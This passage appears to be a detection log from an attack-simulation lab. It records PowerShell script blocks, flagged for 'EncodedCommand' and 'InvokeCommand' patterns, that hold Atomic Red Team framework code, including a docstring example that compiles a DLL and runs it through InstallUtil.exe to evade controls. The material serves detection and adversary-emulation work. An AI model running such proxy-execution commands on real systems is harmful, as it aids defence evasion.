        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCommand,

        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCleanupCommand,

        [AtomicInputArgument[]]
        $InputArguments,

        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $DependencyExecutorType,

        [AtomicDependency[]]
        $Dependencies
    )

    $AtomicTestInstance = [AtomicTest]::new()

    $AtomicTestInstance.name = $Name
    $AtomicTestInstance.description = $Description
    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }

    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

    switch ($PSCmdlet.ParameterSetName) {
        'AutomatedExecutor' {
            $ExecutorInstance = [AtomicExecutorDefault]::new()
            $ExecutorInstance.command = $ExecutorCommand
            $StringsWithPotentialInputArgs.Add($ExecutorCommand)
        }

        'ManualExecutor' {
            $ExecutorInstance = [AtomicExecutorManual]::new()
            $ExecutorInstance.steps = $ExecutorSteps
            $StringsWithPotentialInputArgs.Add($ExecutorSteps)
        }
    }

    switch ($ExecutorType) {
        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }
        default { $ExecutorInstance.name = $ExecutorType.ToLower() }
    }

    if ($ExecutorCleanupCommand) {
        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand
        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)
    }

    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }

    if ($Dependencies) {
        foreach ($Dependency in $Dependencies) {
            $StringsWithPotentialInputArgs.Add($Dependency.description)
            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)
            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)
        }
    }

    if ($DependencyExecutorType) {
        switch ($DependencyExecutorType) {
            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }
            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }
        }
    }    $AtomicTestInstance.dependencies = $Dependencies

    [Hashtable] $InputArgHashtable = @{ }

    if ($InputArguments.Count) {
        # Determine if any of the input argument names repeat. They must be unique.
        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {
            Write-Error ""There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.""
            return
        }

        # Convert each input argument to a hashtable where the key is the Name property.

        foreach ($InputArg in $InputArguments) {
            # Create a copy of the passed input argument that doesn't include the ""Name"" property.
            # Passing in a shallow copy adversely affects YAML serialization for some reason.
            $NewInputArg = [AtomicInputArgument]::new()
            $NewInputArg.default = $InputArg.default
            $NewInputArg.description = $InputArg.description
            $NewInputArg.type = $InputArg.type

            $InputArgHashtable[$InputArg.Name] = $NewInputArg
        }

        $AtomicTestInstance.input_arguments = $InputArgHashtable
    }

    # Extract all specified input arguments from executor and any dependencies.
    $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
    ForEach-Object { $Regex.Matches($_) } |
    Select-Object -ExpandProperty Groups |
    Where-Object { $_.Name -eq 'ArgName' } |
    Select-Object -ExpandProperty Value |
    Sort-Object -Unique


    # Validate that all executor arguments are defined as input arguments
    if ($InputArgumentNamesFromExecutor.Count) {
        $InputArgumentNamesFromExecutor | ForEach-Object {
            if ($InputArgHashtable.Keys -notcontains $_) {
                Write-Error ""The following input argument was specified but is not defined: '$_'""
                return
            }
        }
    }

    # Validate that all defined input args are utilized at least once in the executor.
    if ($InputArgHashtable.Keys.Count) {
        $InputArgHashtable.Keys | ForEach-Object {
            if ($InputArgumentNamesFromExecutor -notcontains $_) {
                # Write a warning since this scenario is not considered a breaking change
                Write-Warning ""The following input argument is defined but not utilized: '$_'.""
            }
        }
    }

    $AtomicTestInstance.executor = $ExecutorInstance

    return $AtomicTestInstance
}

function New-AtomicTestDependency {
    <#
.SYNOPSIS

Specifies a new dependency that must be met prior to execution of an atomic test.

.PARAMETER Description

Specifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING

.PARAMETER PrereqCommand

Specifies commands to check if prerequisites for running this test are met.

For the ""command_prompt"" executor, if any command returns a non-zero exit code, the pre-requisites are not met.

For the ""powershell"" executor, all commands are run as a script block and the script block must return 0 for success.

.PARAMETER GetPrereqCommand

Specifies commands to meet this prerequisite or a message describing how to meet this prereq

More specifically, this command is designed to satisfy either of the following conditions:

1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.
2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.

.EXAMPLE

$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'

.OUTPUTS

AtomicDependency

Outputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.

Note: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to ""Select-Object description, prereq_command, get_prereq_command"".
#>

    [CmdletBinding()]
    [OutputType([AtomicDependency])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $PrereqCommand,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $GetPrereqCommand
    )

    $DependencyInstance = [AtomicDependency]::new()

    $DependencyInstance.description = $Description
    $DependencyInstance.prereq_command = $PrereqCommand
    $DependencyInstance.get_prereq_command = $GetPrereqCommand

    return $DependencyInstance
}

function New-AtomicTestInputArgument {
    <#
.SYNOPSIS

Specifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).

.PARAMETER Name

Specifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.

.PARAMETER Description

Specifies a human-readable description of the input argument.

.PARAMETER Type

Specifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.

.PARAMETER TypeOverride

Specifies an unsupported input argument data type. Specifying this parameter should not be common.

.PARAMETER Default

Specifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.

.EXAMPLE

$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\WinRAR\Rar.exe'

.OUTPUTS

AtomicInputArgument

Outputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.
#>

    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]
    [OutputType([AtomicInputArgument])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]
        [String]
        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]
        $Type,

        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TypeOverride,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Default
    )

    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {
        Write-Error ""Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name""
        return
    }

    $AtomicInputArgInstance = [AtomicInputArgument]::new()

    $AtomicInputArgInstance.description = $Description
    $AtomicInputArgInstance.default = $Default

    if ($Type) {
        $AtomicInputArgInstance.type = $Type

        # Validate input argument types when it makes sense to do so.
        switch ($Type) {
            'Url' {
                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {
                    Write-Warning ""The specified Url is not properly formatted: $Type""
                }
            }

            'Integer' {
                if (-not [Int]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Int is not properly formatted: $Type""
                }
            }

            'Float' {
                if (-not [Double]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Float is not properly formatted: $Type""
                }
            }

            # The following supported data types do not make sense to validate:
            # 'Path' { }
            # 'String' { }
        }
    }
    else {
        $AtomicInputArgInstance.type = $TypeOverride
    }

    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument
    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml
    # won't convert note properties during serialization.
    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value $Name -PassThru

    return $InputArgument
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e #'"
"12/16/2024 8:34:57 PM","35711091","4",", EncodedCommand","EncodedCommand [Score: 4]","19452","# The class definitions that these functions rely upon are located in Private\AtomicClassSchema.ps1

function New-AtomicTechnique {
    <#
.SYNOPSIS

Specifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.

.PARAMETER AttackTechnique

Specifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with ""T"" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN

.PARAMETER DisplayName

Specifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'

.PARAMETER AtomicTests

Specifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

# Note: the input arguments are identical for atomic test #1 and #2
$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
'@

$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2

# Everything is ready to convert to YAML now!
$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml

.OUTPUTS

AtomicTechnique

Outputs an object representing an atomic technique.

The output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.
#>

    [CmdletBinding()]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory)]
        [String[]]
        $AttackTechnique,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DisplayName,

        [Parameter(Mandatory)]
        [AtomicTest[]]
        [ValidateNotNull()]
        $AtomicTests
    )

    $AtomicTechniqueInstance = [AtomicTechnique]::new()

    foreach ($Technique in $AttackTechnique) {
        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.
        # This is not a requirement so just warn the user.
        if ($Technique -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
            Write-Warning ""The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique""
        }
    }

    $AtomicTechniqueInstance.attack_technique = $AttackTechnique
    $AtomicTechniqueInstance.display_name = $DisplayName
    $AtomicTechniqueInstance.atomic_tests = $AtomicTests

    return $AtomicTechniqueInstance
}

function New-AtomicTest {
    <#
.SYNOPSIS

Specifies an atomic test.

.PARAMETER Name

Specifies the name of the test that indicates how it tests the technique.

.PARAMETER Description

Specifies a long form description of the test. Markdown is supported.

.PARAMETER SupportedPlatforms

Specifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.

A single test can support multiple platforms.

.PARAMETER ExecutorType

Specifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.

- CommandPrompt: The Windows Command Prompt, aka cmd.exe
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.

- PowerShell: PowerShell
  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe

- Sh: Linux's bourne shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.

- Bash: Linux's bourne again shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.

.PARAMETER ExecutorElevationRequired

Specifies that the test must run with elevated privileges.

.PARAMETER ExecutorSteps

Specifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.

.PARAMETER ExecutorCommand

Specifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.

The -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the ""PowerShell"" ExecutorType is specified.

.PARAMETER ExecutorCleanupCommand

Specifies the command to execute if there are any artifacts that need to be cleaned up.

.PARAMETER InputArguments

Specifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.

.PARAMETER DependencyExecutorType

Specifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.

In most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.

.PARAMETER Dependencies

Specifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

.OUTPUTS

AtomicTest

Outputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.

The output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.
#>

    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]
    [OutputType([AtomicTest])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String[]]
        [ValidateSet('Windows', 'macOS', 'Linux')]
        $SupportedPlatforms,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $ExecutorType,

        [Switch]
        $ExecutorElevationRequired,

        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorSteps,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCommand,

        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCleanupCommand,

        [AtomicInputArgument[]]
        $InputArguments,

        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $DependencyExecutorType,

        [AtomicDependency[]]
        $Dependencies
    )

    $AtomicTestInstance = [AtomicTest]::new()

    $AtomicTestInstance.name = $Name
    $AtomicTestInstance.description = $Description
    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }

    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

    switch ($PSCmdlet.ParameterSetName) {
        'AutomatedExecutor' {
            $ExecutorInstance = [AtomicExecutorDefault]::new()
            $ExecutorInstance.command = $ExecutorCommand
            $StringsWithPotentialInputArgs.Add($ExecutorCommand)
        }

        'ManualExecutor' {
            $ExecutorInstance = [AtomicExecutorManual]::new()
            $ExecutorInstance.steps = $ExecutorSteps
            $StringsWithPotentialInputArgs.Add($ExecutorSteps)
        }
    }

    switch ($ExecutorType) {
        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }
        default { $ExecutorInstance.name = $ExecutorType.ToLower() }
    }

    if ($ExecutorCleanupCommand) {
        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand
        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)
    }

    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }

    if ($Dependencies) {
        foreach ($Dependency in $Dependencies) {
            $StringsWithPotentialInputArgs.Add($Dependency.description)
            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)
            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)
        }
    }

    if ($DependencyExecutorType) {
        switch ($DependencyExecutorType) {
            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }
            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }
        }
    }    $AtomicTestInstance.dependencies = $Dependencies

    [Hashtable] $InputArgHashtable = @{ }

    if ($InputArguments.Count) {
        # Determine if any of the input argument names repeat. They must be unique.
        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {
            Write-Error ""There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.""
            return
        }

        # Convert each input argument to a hashtable where the key is the Name property.

        foreach ($InputArg in $InputArguments) {
            # Create a copy of the passed input argument that doesn't include the ""Name"" property.
            # Passing in a shallow copy adversely affects YAML serialization for some reason.
            $NewInputArg = [AtomicInputArgument]::new()
            $NewInputArg.default = $InputArg.default
            $NewInputArg.description = $InputArg.description
            $NewInputArg.type = $InputArg.type

            $InputArgHashtable[$InputArg.Name] = $NewInputArg
        }

        $AtomicTestInstance.input_arguments = $InputArgHashtable
    }

    # Extract all specified input arguments from executor and any dependencies.
    $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
    ForEach-Object { $Regex.Matches($_) } |
    Select-Object -ExpandProperty Groups |
    Where-Object { $_.Name -eq 'ArgName' } |
    Select-Object -ExpandProperty Value |
    Sort-Object -Unique


    # Validate that all executor arguments are defined as input arguments
    if ($InputArgumentNamesFromExecutor.Count) {
        $InputArgumentNamesFromExecutor | ForEach-Object {
            if ($InputArgHashtable.Keys -notcontains $_) {
                Write-Error ""The following input argument was specified but is not defined: '$_'""
                return
            }
        }
    }

    # Validate that all defined input args are utilized at least once in the executor.
    if ($InputArgHashtable.Keys.Count) {
        $InputArgHashtable.Keys | ForEach-Object {
            if ($InputArgumentNamesFromExecutor -notcontains $_) {
                # Write a warning since this scenario is not considered a breaking change
                Write-Warning ""The following input argument is defined but not utilized: '$_'.""
            }
        }
    }

    $AtomicTestInstance.executor = $ExecutorInstance

    return $AtomicTestInstance
}

function New-AtomicTestDependency {
    <#
.SYNOPSIS

Specifies a new dependency that must be met prior to execution of an atomic test.

.PARAMETER Description

Specifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING

.PARAMETER PrereqCommand

Specifies commands to check if prerequisites for running this test are met.

For the ""command_prompt"" executor, if any command returns a non-zero exit code, the pre-requisites are not met.

For the ""powershell"" executor, all commands are run as a script block and the script block must return 0 for success.

.PARAMETER GetPrereqCommand

Specifies commands to meet this prerequisite or a message describing how to meet this prereq

More specifically, this command is designed to satisfy either of the following conditions:

1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.
2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.

.EXAMPLE

$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'

.OUTPUTS

AtomicDependency

Outputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.

Note: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to ""Select-Object description, prereq_command, get_prereq_command"".
#>

    [CmdletBinding()]
    [OutputType([AtomicDependency])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $PrereqCommand,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $GetPrereqCommand
    )

    $DependencyInstance = [AtomicDependency]::new()

    $DependencyInstance.description = $Description
    $DependencyInstance.prereq_command = $PrereqCommand
    $DependencyInstance.get_prereq_command = $GetPrereqCommand

    return $DependencyInstance
}

function New-AtomicTestInputArgument {
    <#
.SYNOPSIS

Specifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).

.PARAMETER Name

Specifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.

.PARAMETER Description

Specifies a human-readable description of the input argument.

.PARAMETER Type

Specifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.

.PARAMETER TypeOverride

Specifies an unsupported input argument data type. Specifying this parameter should not be common.

.PARAMETER Default

Specifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.

.EXAMPLE

$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\WinRAR\Rar.exe'

.OUTPUTS

AtomicInputArgument

Outputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.
#>

    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]
    [OutputType([AtomicInputArgument])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]
        [String]
        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]
        $Type,

        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TypeOverride,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Default
    )

    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {
        Write-Error ""Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name""
        return
    }

    $AtomicInputArgInstance = [AtomicInputArgument]::new()

    $AtomicInputArgInstance.description = $Description
    $AtomicInputArgInstance.default = $Default

    if ($Type) {
        $AtomicInputArgInstance.type = $Type

        # Validate input argument types when it makes sense to do so.
        switch ($Type) {
            'Url' {
                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {
                    Write-Warning ""The specified Url is not properly formatted: $Type""
                }
            }

            'Integer' {
                if (-not [Int]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Int is not properly formatted: $Type""
                }
            }

            'Float' {
                if (-not [Double]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Float is not properly formatted: $Type""
                }
            }

            # The following supported data types do not make sense to validate:
            # 'Path' { }
            # 'String' { }
        }
    }
    else {
        $AtomicInputArgInstance.type = $TypeOverride
    }

    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument
    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml
    # won't convert note properties during serialization.
    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value $Name -PassThru

    return $InputArgument
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e #'"
"12/16/2024 8:34:54 PM","35710588","4",", InvokeCommand","InvokeCommand [Score: 4]","3474","function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {
    $null = @(
        if ($null -eq $finalCommand) { return 0 }
        $finalCommand = $finalCommand.trim()
        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'
        if ($executor -eq ""command_prompt"" -or $executor -eq ""sh"" -or $executor -eq ""bash"") {
            $execPrefix = ""-c""
            $execExe = $executor
            if ($executor -eq ""command_prompt"") {
                $execPrefix = ""/c"";
                $execExe = ""cmd.exe"";
                $execCommand = $finalCommand -replace ""`n"", "" & ""
                $arguments = $execPrefix, ""$execCommand""
            }
            else {
                $finalCommand = $finalCommand -replace ""[\\](?!;)"", ""`\$&""
                $finalCommand = $finalCommand -replace ""[`""]"", ""`\$&""
                $execCommand = $finalCommand -replace ""(?<!;)\n"", ""; ""
                $arguments = ""$execPrefix `""$execCommand`""""

            }
        }
        elseif ($executor -eq ""powershell"") {
            $execCommand = $finalCommand -replace ""`"""", ""`\`""`""""
            if ($session) {
                if ($executionPlatform -eq ""windows"") {
                    $execExe = ""powershell.exe""
                }
                else {
                    $execExe = ""pwsh""
                }
            }
            else {
                $execExe = ""powershell.exe""; if ($IsLinux -or $IsMacOS) { $execExe = ""pwsh"" }
            }
            if ($execExe -eq ""pwsh"") {
                $arguments = ""-Command $execCommand""
            }
            else {
                $arguments = ""& {$execCommand}""
            }
        }
        else {
            Write-Warning -Message ""Unable to generate or execute the command line properly. Unknown executor""
            return [PSCustomObject]@{
                StandardOutput = """"
                ErrorOutput    = """"
                ExitCode       = -1
                IsTimeOut      = $false
            }
        }

        # Write-Host -ForegroundColor Magenta ""$execExe $arguments""
        if ($session) {
            $scriptParentPath = Split-Path $import -Parent
            $fp = Join-Path $scriptParentPath ""Invoke-Process.ps1""
            $fp2 = Join-Path $scriptParentPath ""Invoke-KillProcessTree.ps1""
            invoke-command -Session $session -FilePath $fp
            invoke-command -Session $session -FilePath $fp2
            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt"" }
        }
        else {
            if ($interactive) {
                # This use case is: Local execution of tests that contain interactive prompts
                #   In this situation, let the stdout/stderr flow to the console
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds
            }
            else {
                # Local execution that DO NOT contain interactive prompts
                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt""
            }
        }
    )
    $res
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:56 PM","35710918","4",", InvokeCommand","InvokeCommand [Score: 4]","3474","function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {
    $null = @(
        if ($null -eq $finalCommand) { return 0 }
        $finalCommand = $finalCommand.trim()
        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'
        if ($executor -eq ""command_prompt"" -or $executor -eq ""sh"" -or $executor -eq ""bash"") {
            $execPrefix = ""-c""
            $execExe = $executor
            if ($executor -eq ""command_prompt"") {
                $execPrefix = ""/c"";
                $execExe = ""cmd.exe"";
                $execCommand = $finalCommand -replace ""`n"", "" & ""
                $arguments = $execPrefix, ""$execCommand""
            }
            else {
                $finalCommand = $finalCommand -replace ""[\\](?!;)"", ""`\$&""
                $finalCommand = $finalCommand -replace ""[`""]"", ""`\$&""
                $execCommand = $finalCommand -replace ""(?<!;)\n"", ""; ""
                $arguments = ""$execPrefix `""$execCommand`""""

            }
        }
        elseif ($executor -eq ""powershell"") {
            $execCommand = $finalCommand -replace ""`"""", ""`\`""`""""
            if ($session) {
                if ($executionPlatform -eq ""windows"") {
                    $execExe = ""powershell.exe""
                }
                else {
                    $execExe = ""pwsh""
                }
            }
            else {
                $execExe = ""powershell.exe""; if ($IsLinux -or $IsMacOS) { $execExe = ""pwsh"" }
            }
            if ($execExe -eq ""pwsh"") {
                $arguments = ""-Command $execCommand""
            }
            else {
                $arguments = ""& {$execCommand}""
            }
        }
        else {
            Write-Warning -Message ""Unable to generate or execute the command line properly. Unknown executor""
            return [PSCustomObject]@{
                StandardOutput = """"
                ErrorOutput    = """"
                ExitCode       = -1
                IsTimeOut      = $false
            }
        }

        # Write-Host -ForegroundColor Magenta ""$execExe $arguments""
        if ($session) {
            $scriptParentPath = Split-Path $import -Parent
